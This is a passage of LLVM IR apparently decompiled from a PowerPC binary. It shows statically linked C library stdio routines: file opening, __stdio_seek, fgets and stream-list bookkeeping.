dec_label_pc_10012958:                            ; preds = %dec_label_pc_10012a18, %dec_label_pc_100129e8, %dec_label_pc_1001294c
  %v0_10012958 = call i32 @__errno_location()
  %v0_1001295c = load i32, i32* @r31, align 4
  %v3_1001295c = icmp eq i32 %v0_1001295c, 0
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10012964 = inttoptr i32 %v0_10012958 to i32*
  store i32 22, i32* %v2_10012964, align 4
  br i1 %v3_1001295c, label %dec_label_pc_10012bb8, label %dec_label_pc_1001296c

dec_label_pc_1001296c:                            ; preds = %dec_label_pc_10012958, %dec_label_pc_10012a4c
  %v0_1001296c = load i32, i32* @r31, align 4
  %v1_1001296c = inttoptr i32 %v0_1001296c to i16*
  %v2_1001296c = load i16, i16* %v1_1001296c, align 2
  %v3_1001296c = zext i16 %v2_1001296c to i32
  store i32 %v3_1001296c, i32* %r0.global-to-local, align 4
  %v1_10012970 = and i32 %v3_1001296c, 8192
  store i32 %v1_10012970, i32* %r9.global-to-local, align 4
  %v3_10012970 = icmp eq i32 %v1_10012970, 0
  store i1 %v3_10012970, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_10012970, label %dec_label_pc_10012bb8, label %dec_label_pc_10012978

dec_label_pc_10012978:                            ; preds = %dec_label_pc_1001296c
  store i32 ptrtoint (i32* @global_var_10012980.836 to i32), i32* @lr, align 4
  %v2_1001297c = call i32 @free(i32 %v0_1001296c)
  br label %dec_label_pc_10012bb8

dec_label_pc_10012984:                            ; preds = %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10012988

dec_label_pc_10012988:                            ; preds = %dec_label_pc_1001294c, %dec_label_pc_10012940, %dec_label_pc_10012984
  %v0_100129a8 = phi i32 [ 1089, %dec_label_pc_1001294c ], [ 577, %dec_label_pc_10012940 ], [ 1, %dec_label_pc_10012984 ]
  %v2_10012988 = add i32 %tmp, 1
  %v3_10012988 = inttoptr i32 %v2_10012988 to i8*
  %v4_10012988 = load i8, i8* %v3_10012988, align 1
  %v5_10012988 = zext i8 %v4_10012988 to i32
  store i32 %v5_10012988, i32* %r0.global-to-local, align 4
  %v3_10012990 = icmp eq i8 %v4_10012988, 98
  br i1 %v3_10012990, label %dec_label_pc_1001299c, label %dec_label_pc_10012998

dec_label_pc_10012998:                            ; preds = %dec_label_pc_10012988
  br label %dec_label_pc_1001299c

dec_label_pc_1001299c:                            ; preds = %dec_label_pc_10012988, %dec_label_pc_10012998
  %storemerge = phi i32 [ %tmp, %dec_label_pc_10012998 ], [ %v2_10012988, %dec_label_pc_10012988 ]
  %v0_1001299c = phi i32 [ %tmp, %dec_label_pc_10012998 ], [ %v2_10012988, %dec_label_pc_10012988 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_1001299c = add i32 %v0_1001299c, 1
  %v2_1001299c = inttoptr i32 %v1_1001299c to i8*
  %v3_1001299c = load i8, i8* %v2_1001299c, align 1
  %v4_1001299c = zext i8 %v3_1001299c to i32
  store i32 %v4_1001299c, i32* %r0.global-to-local, align 4
  %v3_100129a0 = icmp eq i8 %v3_1001299c, 43
  br i1 %v3_100129a0, label %dec_label_pc_100129a8, label %dec_label_pc_100129b0

dec_label_pc_100129a8:                            ; preds = %dec_label_pc_1001299c
  store i32 %v0_100129a8, i32* %r9.global-to-local, align 4
  %v1_100129ac = add nuw nsw i32 %v0_100129a8, 1
  store i32 %v1_100129ac, i32* @r28, align 4
  br label %dec_label_pc_100129b0

dec_label_pc_100129b0:                            ; preds = %dec_label_pc_1001299c, %dec_label_pc_100129a8
  %v3_100129b0 = icmp eq i32 %v0_1001292c, 0
  br i1 %v3_100129b0, label %dec_label_pc_100129b8, label %dec_label_pc_100129e0

dec_label_pc_100129b8:                            ; preds = %dec_label_pc_100129b0
  store i32 268511680, i32* @lr, align 4
  %v1_100129bc = call i32 @malloc(i32 80)
  store i32 %v1_100129bc, i32* @r31, align 4
  %v4_100129c0 = icmp eq i32 %v1_100129bc, 0
  store i1 %v4_100129c0, i1* %cr0_eq.global-to-local, align 1
  br i1 %v4_100129c0, label %dec_label_pc_10012bbc, label %dec_label_pc_100129c8

dec_label_pc_100129c8:                            ; preds = %dec_label_pc_100129b8
  %v1_100129cc = add i32 %v1_100129bc, 56
  store i32 %v1_100129cc, i32* @r3, align 4
  %v3_100129d0 = inttoptr i32 %v1_100129bc to i16*
  store i16 8192, i16* %v3_100129d0, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100129d8 = load i32, i32* @r31, align 4
  %v2_100129d8 = add i32 %v1_100129d8, 8
  %v3_100129d8 = inttoptr i32 %v2_100129d8 to i32*
  store i32 0, i32* %v3_100129d8, align 4
  store i32 268511712, i32* @lr, align 4
  %v0_100129dc = call i32 @__stdio_init_mutex()
  %v0_100129e0.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100129e0

dec_label_pc_100129e0:                            ; preds = %dec_label_pc_100129b0, %dec_label_pc_100129c8
  %v0_10012a40 = phi i32 [ %v0_10012930, %dec_label_pc_100129b0 ], [ %v0_100129e0.pre, %dec_label_pc_100129c8 ]
  %v1_100129e0 = icmp slt i32 %v0_10012a40, 0
  br i1 %v1_100129e0, label %dec_label_pc_10012a40, label %dec_label_pc_100129e8

dec_label_pc_100129e8:                            ; preds = %dec_label_pc_100129e0
  %v1_100129ec = add i32 %arg1, 1
  store i32 %v1_100129ec, i32* %r0.global-to-local, align 4
  store i32 65539, i32* %r9.global-to-local, align 4
  %v1_100129f4 = load i32, i32* @r31, align 4
  %v2_100129f4 = add i32 %v1_100129f4, 4
  %v3_100129f4 = inttoptr i32 %v2_100129f4 to i32*
  store i32 %v0_10012a40, i32* %v3_100129f4, align 4
  %v0_100129f8 = load i32, i32* @r28, align 4
  %v1_100129f8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100129f8 = and i32 %v1_100129f8, %v0_100129f8
  %v1_100129fc = add i32 %v2_100129f8, 1
  store i32 %v1_100129fc, i32* %r9.global-to-local, align 4
  %v1_10012a00 = load i32, i32* %r0.global-to-local, align 4
  %v2_10012a00 = and i32 %v1_10012a00, %v1_100129fc
  store i32 %v2_10012a00, i32* %r0.global-to-local, align 4
  %v4_10012a04 = icmp eq i32 %v2_10012a00, %v1_100129fc
  br i1 %v4_10012a04, label %dec_label_pc_10012a0c, label %dec_label_pc_10012958

dec_label_pc_10012a0c:                            ; preds = %dec_label_pc_100129e8
  %v2_10012a0c = sub i32 -1, %arg1
  %v3_10012a0c = and i32 %v0_100129f8, %v2_10012a0c
  store i32 %v3_10012a0c, i32* %r0.global-to-local, align 4
  %v1_10012a10 = and i32 %v3_10012a0c, 1024
  store i32 %v1_10012a10, i32* %r9.global-to-local, align 4
  %v3_10012a10 = icmp eq i32 %v1_10012a10, 0
  store i1 %v3_10012a10, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_10012a10, label %dec_label_pc_10012a34, label %dec_label_pc_10012a18

dec_label_pc_10012a18:                            ; preds = %dec_label_pc_10012a0c
  %v0_10012a18 = load i32, i32* @r29, align 4
  store i32 268511788, i32* @lr, align 4
  %v2_10012a28 = call i32 @__libc_fcntl(i32 %v0_10012a18, i32 4)
  %v3_10012a2c = icmp eq i32 %v2_10012a28, 0
  br i1 %v3_10012a2c, label %dec_label_pc_10012a34, label %dec_label_pc_10012958

dec_label_pc_10012a34:                            ; preds = %dec_label_pc_10012a18, %dec_label_pc_10012a0c
  %v1_10012a34 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 15, i32 15)
  store i32 %v1_10012a34, i32* %r0.global-to-local, align 4
  %v0_10012a38 = load i32, i32* @r28, align 4
  %v2_10012a38 = or i32 %v0_10012a38, %v1_10012a34
  store i32 %v2_10012a38, i32* @r28, align 4
  br label %dec_label_pc_10012a6c

dec_label_pc_10012a40:                            ; preds = %dec_label_pc_100129e0
  %v3_10012a40 = icmp eq i32 %v0_10012a40, -1
  %v0_10012a50.pre = load i32, i32* @r28, align 4
  br i1 %v3_10012a40, label %dec_label_pc_10012a4c, label %dec_label_pc_10012a48

dec_label_pc_10012a48:                            ; preds = %dec_label_pc_10012a40
  %v1_10012a48 = or i32 %v0_10012a50.pre, 65536
  store i32 %v1_10012a48, i32* @r28, align 4
  br label %dec_label_pc_10012a4c

dec_label_pc_10012a4c:                            ; preds = %dec_label_pc_10012a40, %dec_label_pc_10012a48
  %v0_10012a50 = phi i32 [ %v1_10012a48, %dec_label_pc_10012a48 ], [ %v0_10012a50.pre, %dec_label_pc_10012a40 ]
  store i32 438, i32* @r5, align 4
  store i32 268511840, i32* @lr, align 4
  %v2_10012a5c = call i32 @__libc_open(i32 %arg1, i32 %v0_10012a50)
  %v1_10012a60 = icmp slt i32 %v2_10012a5c, 0
  %v1_10012a64 = load i32, i32* @r31, align 4
  %v2_10012a64 = add i32 %v1_10012a64, 4
  %v3_10012a64 = inttoptr i32 %v2_10012a64 to i32*
  store i32 %v2_10012a5c, i32* %v3_10012a64, align 4
  br i1 %v1_10012a60, label %dec_label_pc_1001296c, label %dec_label_pc_10012a4c.dec_label_pc_10012a6c_crit_edge

dec_label_pc_10012a4c.dec_label_pc_10012a6c_crit_edge: ; preds = %dec_label_pc_10012a4c
  %v0_10012a70.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10012a6c

dec_label_pc_10012a6c:                            ; preds = %dec_label_pc_10012a4c.dec_label_pc_10012a6c_crit_edge, %dec_label_pc_10012a34
  %v0_10012a70 = phi i32 [ %v0_10012a70.pre, %dec_label_pc_10012a4c.dec_label_pc_10012a6c_crit_edge ], [ %v2_10012a38, %dec_label_pc_10012a34 ]
  %v0_10012a6c = load i32, i32* @r31, align 4
  %v1_10012a6c = inttoptr i32 %v0_10012a6c to i16*
  %v2_10012a6c = load i16, i16* %v1_10012a6c, align 2
  %v3_10012a6c = zext i16 %v2_10012a6c to i32
  store i32 %v3_10012a6c, i32* %r0.global-to-local, align 4
  %v1_10012a70 = urem i32 %v0_10012a70, 4
  store i32 %v1_10012a70, i32* %r29.global-to-local, align 4
  %v1_10012a74 = call i32 @__asm_rlwinm(i32 %v0_10012a70, i32 0, i32 21, i32 21)
  %v1_10012a78 = add nuw nsw i32 %v1_10012a70, 1
  store i32 %v1_10012a78, i32* %r29.global-to-local, align 4
  %v1_10012a7c = call i32 @__asm_rlwinm(i32 %v3_10012a6c, i32 0, i32 18, i32 18)
  store i32 %v1_10012a7c, i32* %r0.global-to-local, align 4
  %v1_10012a80 = xor i32 %v1_10012a78, 3
  store i32 %v1_10012a80, i32* %r29.global-to-local, align 4
  %v1_10012a84 = urem i32 %v1_10012a7c, 65536
  store i32 %v1_10012a84, i32* %r9.global-to-local, align 4
  %v0_10012a88 = load i32, i32* @r28, align 4
  %v1_10012a88 = call i32 @__asm_rlwinm(i32 %v0_10012a88, i32 31, i32 16, i32 16)
  %v2_10012a8c = or i32 %v1_10012a88, %v1_10012a74
  store i32 %v2_10012a8c, i32* %r0.global-to-local, align 4
  %v0_10012a90 = load i32, i32* %r29.global-to-local, align 4
  %v1_10012a90 = mul i32 %v0_10012a90, 16
  %v0_10012a94 = load i32, i32* %r9.global-to-local, align 4
  %v2_10012a94 = or i32 %v0_10012a94, %v2_10012a8c
  store i32 %v2_10012a94, i32* %r9.global-to-local, align 4
  %v2_10012a98 = or i32 %v2_10012a94, %v1_10012a90
  store i32 %v2_10012a98, i32* @r29, align 4
  %v1_10012a9c = trunc i32 %v2_10012a98 to i16
  %v2_10012a9c = load i32, i32* @r31, align 4
  %v3_10012a9c = inttoptr i32 %v2_10012a9c to i16*
  store i16 %v1_10012a9c, i16* %v3_10012a9c, align 2
  %v0_10012aa0 = call i32 @__errno_location()
  store i32 %v0_10012aa0, i32* @r28, align 4
  %v0_10012aa8 = load i32, i32* @r31, align 4
  %v1_10012aa8 = add i32 %v0_10012aa8, 4
  %v2_10012aa8 = inttoptr i32 %v1_10012aa8 to i32*
  %v3_10012aa8 = load i32, i32* %v2_10012aa8, align 4
  %v1_10012aac = inttoptr i32 %v0_10012aa0 to i32*
  %v2_10012aac = load i32, i32* %v1_10012aac, align 4
  store i32 %v2_10012aac, i32* @r27, align 4
  store i32 268511924, i32* @lr, align 4
  %v1_10012ab0 = call i32 @isatty(i32 %v3_10012aa8)
  %v1_10012ab4 = mul i32 %v1_10012ab0, 256
  %v0_10012ab8 = load i32, i32* @r29, align 4
  %v2_10012ab8 = or i32 %v0_10012ab8, %v1_10012ab4
  store i32 %v2_10012ab8, i32* @r29, align 4
  %v1_10012abc = trunc i32 %v2_10012ab8 to i16
  %v2_10012abc = load i32, i32* @r31, align 4
  %v3_10012abc = inttoptr i32 %v2_10012abc to i16*
  store i16 %v1_10012abc, i16* %v3_10012abc, align 2
  %v0_10012ac0 = load i32, i32* @r27, align 4
  %v1_10012ac0 = load i32, i32* @r28, align 4
  %v2_10012ac0 = inttoptr i32 %v1_10012ac0 to i32*
  store i32 %v0_10012ac0, i32* %v2_10012ac0, align 4
  %v0_10012ac4 = load i32, i32* @r31, align 4
  %v1_10012ac4 = add i32 %v0_10012ac4, 8
  %v2_10012ac4 = inttoptr i32 %v1_10012ac4 to i32*
  %v3_10012ac4 = load i32, i32* %v2_10012ac4, align 4
  store i32 %v3_10012ac4, i32* %r0.global-to-local, align 4
  %v3_10012ac8 = icmp eq i32 %v3_10012ac4, 0
  br i1 %v3_10012ac8, label %dec_label_pc_10012ad0, label %dec_label_pc_10012b00

dec_label_pc_10012ad0:                            ; preds = %dec_label_pc_10012a6c
  store i32 268511960, i32* @lr, align 4
  %v1_10012ad4 = call i32 @malloc(i32 4096)
  %v3_10012ad8 = icmp eq i32 %v1_10012ad4, 0
  %v1_10012adc = load i32, i32* @r31, align 4
  %v2_10012adc = add i32 %v1_10012adc, 8
  %v3_10012adc = inttoptr i32 %v2_10012adc to i32*
  store i32 %v1_10012ad4, i32* %v3_10012adc, align 4
  %v1_10012afc = load i32, i32* @r31, align 4
  br i1 %v3_10012ad8, label %dec_label_pc_10012afc, label %dec_label_pc_10012ae4

dec_label_pc_10012ae4:                            ; preds = %dec_label_pc_10012ad0
  %v1_10012ae4 = inttoptr i32 %v1_10012afc to i16*
  %v2_10012ae4 = load i16, i16* %v1_10012ae4, align 2
  %v3_10012ae4 = zext i16 %v2_10012ae4 to i32
  store i32 %v3_10012ae4, i32* %r0.global-to-local, align 4
  %v1_10012ae8 = add i32 %v1_10012ad4, 4096
  store i32 %v1_10012ae8, i32* %r9.global-to-local, align 4
  %v2_10012aec = add i32 %v1_10012afc, 12
  %v3_10012aec = inttoptr i32 %v2_10012aec to i32*
  store i32 %v1_10012ae8, i32* %v3_10012aec, align 4
  %v0_10012af0 = load i32, i32* %r0.global-to-local, align 4
  %v1_10012af0 = or i32 %v0_10012af0, 16384
  store i32 %v1_10012af0, i32* %r0.global-to-local, align 4
  %v1_10012af4 = trunc i32 %v1_10012af0 to i16
  %v2_10012af4 = load i32, i32* @r31, align 4
  %v3_10012af4 = inttoptr i32 %v2_10012af4 to i16*
  store i16 %v1_10012af4, i16* %v3_10012af4, align 2
  br label %dec_label_pc_10012b00

dec_label_pc_10012afc:                            ; preds = %dec_label_pc_10012ad0
  %v2_10012afc = add i32 %v1_10012afc, 12
  %v3_10012afc = inttoptr i32 %v2_10012afc to i32*
  store i32 0, i32* %v3_10012afc, align 4
  br label %dec_label_pc_10012b00

dec_label_pc_10012b00:                            ; preds = %dec_label_pc_10012a6c, %dec_label_pc_10012ae4, %dec_label_pc_10012afc
  %v0_10012b00 = load i32, i32* @r31, align 4
  %v1_10012b00 = inttoptr i32 %v0_10012b00 to i16*
  %v2_10012b00 = load i16, i16* %v1_10012b00, align 2
  %v3_10012b00 = zext i16 %v2_10012b00 to i32
  store i32 %v3_10012b00, i32* %r0.global-to-local, align 4
  %v1_10012b04 = add i32 %v0_10012b00, 8
  %v2_10012b04 = inttoptr i32 %v1_10012b04 to i32*
  %v3_10012b04 = load i32, i32* %v2_10012b04, align 4
  store i32 %v3_10012b04, i32* %r9.global-to-local, align 4
  %v1_10012b08 = and i32 %v3_10012b00, 8192
  %v3_10012b08 = icmp eq i32 %v1_10012b08, 0
  store i1 %v3_10012b08, i1* %cr0_eq.global-to-local, align 1
  %v3_10012b10 = add i32 %v0_10012b00, 2
  %v4_10012b10 = inttoptr i32 %v3_10012b10 to i8*
  store i8 0, i8* %v4_10012b10, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10012b18 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012b18 = load i32, i32* @r31, align 4
  %v2_10012b18 = add i32 %v1_10012b18, 20
  %v3_10012b18 = inttoptr i32 %v2_10012b18 to i32*
  store i32 %v0_10012b18, i32* %v3_10012b18, align 4
  %v0_10012b1c = load i32, i32* %r9.global-to-local, align 4
  %v1_10012b1c = load i32, i32* @r31, align 4
  %v2_10012b1c = add i32 %v1_10012b1c, 24
  %v3_10012b1c = inttoptr i32 %v2_10012b1c to i32*
  store i32 %v0_10012b1c, i32* %v3_10012b1c, align 4
  %v0_10012b20 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012b20 = load i32, i32* @r31, align 4
  %v2_10012b20 = add i32 %v1_10012b20, 28
  %v3_10012b20 = inttoptr i32 %v2_10012b20 to i32*
  store i32 %v0_10012b20, i32* %v3_10012b20, align 4
  %v0_10012b24 = load i32, i32* %r9.global-to-local, align 4
  %v1_10012b24 = load i32, i32* @r31, align 4
  %v2_10012b24 = add i32 %v1_10012b24, 16
  %v3_10012b24 = inttoptr i32 %v2_10012b24 to i32*
  store i32 %v0_10012b24, i32* %v3_10012b24, align 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v0_10012b2c = load i32, i32* %r0.global-to-local, align 4
  %v1_10012b2c = load i32, i32* @r31, align 4
  %v2_10012b2c = add i32 %v1_10012b2c, 44
  %v3_10012b2c = inttoptr i32 %v2_10012b2c to i32*
  store i32 %v0_10012b2c, i32* %v3_10012b2c, align 4
  %v3_10012b30 = load i32, i32* @global_var_1002b8e4.837, align 4
  store i32 %v3_10012b30, i32* %r0.global-to-local, align 4
  %v1_10012b34 = load i32, i32* @r31, align 4
  %v2_10012b34 = add i32 %v1_10012b34, 52
  %v3_10012b34 = inttoptr i32 %v2_10012b34 to i32*
  store i32 %v3_10012b30, i32* %v3_10012b34, align 4
  %v0_10012b38 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10012b38, label %dec_label_pc_10012bbc, label %dec_label_pc_10012b3c

dec_label_pc_10012b3c:                            ; preds = %dec_label_pc_10012b00
  store i32 ptrtoint ([3 x i8]* @global_var_10010048.752 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1002b58c.713 to i32), i32* %r29.global-to-local, align 4
  %v2_10012b4c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10012b4c, i32* @r26, align 4
  store i32 %v2_10012b4c, i32* @r3, align 4
  %v0_10012b5c = call i32 @__pthread_return_void()
  %v2_10012b68 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10012b68, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_1002b574.712 to i32), i32* @r29, align 4
  %v0_10012b70 = call i32 @__pthread_return_0()
  store i32 %v2_10012b68, i32* @r3, align 4
  %v0_10012b80 = call i32 @__pthread_return_void()
  %v0_10012b88 = call i32 @__pthread_return_0()
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_10012b90 = load i32, i32* bitcast (i32** @global_var_1002b8e0.714 to i32*), align 4
  store i32 %v3_10012b90, i32* %r0.global-to-local, align 4
  store i32 %v2_10012b68, i32* @r3, align 4
  %v1_10012b9c = load i32, i32* @r31, align 4
  %v2_10012b9c = add i32 %v1_10012b9c, 32
  %v3_10012b9c = inttoptr i32 %v2_10012b9c to i32*
  store i32 %v3_10012b90, i32* %v3_10012b9c, align 4
  %v0_10012ba0 = load i32, i32* @r31, align 4
  store i32 %v0_10012ba0, i32* bitcast (i32** @global_var_1002b8e0.714 to i32*), align 4
  %v0_10012ba4 = call i32 @__pthread_return_void()
  store i32 %v2_10012b4c, i32* @r3, align 4
  %v0_10012bb0 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10012bbc

dec_label_pc_10012bb8:                            ; preds = %dec_label_pc_1001296c, %dec_label_pc_10012958, %dec_label_pc_10012978
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_10012bbc

dec_label_pc_10012bbc:                            ; preds = %dec_label_pc_10012b00, %dec_label_pc_100129b8, %dec_label_pc_10012b3c, %dec_label_pc_10012bb8
  store i32 %v0_10012918, i32* %r0.global-to-local, align 4
  %v0_10012bc0 = load i32, i32* @r31, align 4
  ret i32 %v0_10012bc0

; uselistorder directives
  uselistorder i32 %v1_10012afc, { 2, 0, 1 }
  uselistorder i32 %v0_10012a70, { 1, 0 }
  uselistorder i32 %v1_100129bc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100129a8, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 1, 2, 3, 4, 5, 6 }
  uselistorder i1* %cr0_eq.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 16384, { 4, 0, 1, 2, 3 }
  uselistorder i32 4096, { 13, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 12 }
  uselistorder i32 (i32)* @isatty, { 2, 0, 1 }
  uselistorder i32 21, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @__libc_open, { 1, 0, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 1024, { 7, 6, 4, 5, 0, 1, 2, 3 }
  uselistorder i32 ()* @__stdio_init_mutex, { 0, 3, 2, 1, 4 }
  uselistorder i32 56, { 3, 2, 5, 4, 0, 1 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i32 22, { 1, 15, 2, 13, 10, 3, 11, 4, 5, 16, 6, 17, 7, 14, 8, 9, 0, 12 }
  uselistorder i32 577, { 0, 3, 1, 2 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 3, 0, 2, 4 }
  uselistorder label %dec_label_pc_10012bbc, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10012bb8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012b00, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10012a4c, { 1, 0 }
  uselistorder label %dec_label_pc_100129e0, { 1, 0 }
  uselistorder label %dec_label_pc_100129b0, { 1, 0 }
  uselistorder label %dec_label_pc_1001299c, { 1, 0 }
  uselistorder label %dec_label_pc_10012988, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001296c, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %v0_10012bd4 = load i32, i32* @lr, align 4
  store i32 %v0_10012bd4, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r7, align 4
  %v0_10012be0 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v1_10012bec = add i32 %arg1, 4
  %v2_10012bec = inttoptr i32 %v1_10012bec to i32*
  %v3_10012bec = load i32, i32* %v2_10012bec, align 4
  %v2_10012bf0 = load i32, i32* %arg2, align 4
  %v1_10012bf4 = add i32 %tmp, 4
  %v2_10012bf4 = inttoptr i32 %v1_10012bf4 to i32*
  %v3_10012bf4 = load i32, i32* %v2_10012bf4, align 4
  store i32 268512252, i32* @lr, align 4
  %v4_10012bf8 = call i32 @__libc_lseek64(i32 %v3_10012bec, i32 %v2_10012bf0, i32 %v3_10012bf4, i32 %arg3)
  %v1_10012bfc = icmp slt i32 %v4_10012bf8, 0
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br i1 %v1_10012bfc, label %dec_label_pc_10012c14, label %dec_label_pc_10012c08

dec_label_pc_10012c08:                            ; preds = %entry
  %v1_10012c08 = load i32, i32* @r31, align 4
  %v2_10012c08 = inttoptr i32 %v1_10012c08 to i32*
  store i32 %v4_10012bf8, i32* %v2_10012c08, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10012c10 = load i32, i32* @r31, align 4
  %v2_10012c10 = add i32 %v1_10012c10, 4
  %v3_10012c10 = inttoptr i32 %v2_10012c10 to i32*
  store i32 %tmp, i32* %v3_10012c10, align 4
  %v0_10012c14.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10012c14

dec_label_pc_10012c14:                            ; preds = %entry, %dec_label_pc_10012c08
  %v0_10012c14 = phi i32 [ %tmp, %entry ], [ %v0_10012c14.pre, %dec_label_pc_10012c08 ]
  store i32 %v0_10012bd4, i32* %r0.global-to-local, align 4
  store i32 %v0_10012be0, i32* @r31, align 4
  ret i32 %v0_10012c14

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_10012c14, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10012c34 = call i32 @__asm_mfcr()
  store i32 %arg2, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* %r31.global-to-local, align 4
  store i32 %v0_10012c34, i32* %r28.global-to-local, align 4
  %v1_10012c58 = add i32 %arg3, 52
  %v2_10012c58 = inttoptr i32 %v1_10012c58 to i32*
  %v3_10012c58 = load i32, i32* %v2_10012c58, align 4
  %v2_10012c5c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10012c5c, i32* @r3, align 4
  %v3_10012c68 = icmp eq i32 %v3_10012c58, 0
  store i1 %v3_10012c68, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_10012c68, label %dec_label_pc_10012c70, label %dec_label_pc_10012c7c

dec_label_pc_10012c70:                            ; preds = %entry
  %v0_10012c70 = call i32 @__pthread_return_void()
  %v0_10012c78 = call i32 @__pthread_return_0()
  %v0_10012c7c.pre = load i32, i32* %r30.global-to-local, align 4
  %v0_10012c80.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10012c84.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10012c7c

dec_label_pc_10012c7c:                            ; preds = %entry, %dec_label_pc_10012c70
  %v0_10012c84 = phi i32 [ %v0_10012c34, %entry ], [ %v0_10012c84.pre, %dec_label_pc_10012c70 ]
  %v0_10012c80 = phi i32 [ %arg3, %entry ], [ %v0_10012c80.pre, %dec_label_pc_10012c70 ]
  %v0_10012c7c = phi i32 [ %arg2, %entry ], [ %v0_10012c7c.pre, %dec_label_pc_10012c70 ]
  store i32 268512396, i32* @lr, align 4
  %v3_10012c88 = inttoptr i32 %v0_10012c84 to i8*
  %v4_10012c88 = call i32 @__GI_fgets_unlocked(i8* %v3_10012c88, i32 %v0_10012c7c, i32 %v0_10012c80)
  store i32 %v4_10012c88, i32* @r31, align 4
  store i32 %v2_10012c5c, i32* @r3, align 4
  %v0_10012c98 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10012c98, label %dec_label_pc_10012c9c, label %dec_label_pc_10012ca0

dec_label_pc_10012c9c:                            ; preds = %dec_label_pc_10012c7c
  %v0_10012c9c = call i32 @__pthread_return_void()
  %v0_10012ca4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10012ca0

dec_label_pc_10012ca0:                            ; preds = %dec_label_pc_10012c7c, %dec_label_pc_10012c9c
  %v0_10012ca4 = phi i32 [ %v4_10012c88, %dec_label_pc_10012c7c ], [ %v0_10012ca4.pre, %dec_label_pc_10012c9c ]
  %v1_10012cb4 = call %1 @__asm_mtcrf(i32 8, i32 %v0_10012c34)
  %v9_10012cb4 = extractvalue %1 %v1_10012cb4, 7
  store i4 %v9_10012cb4, i4* @cr4, align 1
  ret i32 %v0_10012ca4

; uselistorder directives
  uselistorder i32 %v0_10012c34, { 1, 0, 2 }
  uselistorder i32 52, { 4, 5, 1, 6, 3, 2, 8, 7, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10012ca0, { 1, 0 }
  uselistorder label %dec_label_pc_10012c7c, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10010048.752 to i32), i32* @r31, align 4
  store i32 ptrtoint (i32* @global_var_1002b58c.713 to i32), i32* @r29, align 4
  %v2_10012ce4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10012ce4, i32* @r3, align 4
  %v0_10012cec = call i32 @__pthread_return_void()
  %v0_10012cf4 = call i32 @__pthread_return_0()
  %v3_10012cfc = load i32, i32* @global_var_1002b930.832, align 4
  %v3_10012d00 = icmp eq i32 %v3_10012cfc, 1
  br i1 %v3_10012d00, label %dec_label_pc_10012d08, label %dec_label_pc_10012db0

dec_label_pc_10012d08:                            ; preds = %entry
